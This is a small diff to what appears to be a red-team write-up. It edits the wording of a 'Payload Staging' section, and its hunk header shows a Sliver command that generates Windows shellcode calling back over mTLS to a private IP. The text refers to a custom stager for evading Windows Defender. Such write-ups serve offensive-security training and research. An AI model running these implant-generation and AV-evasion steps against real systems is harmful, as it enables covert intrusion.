@@ -147,7 +147,7 @@ sliver > generate --mtls 10.200.24.159:443 --format shellcode --os windows --arc
 
 ### Payload Staging
 
-The implant is prepared for delivery using a custom stager to bypass Windows Defender:
+The implant is prepared for delivery using my custom AV bypass stager. I'll be releasing a detailed walkthrough on this technique shortly.
 
 ```bash
 # Copy implant to workspace
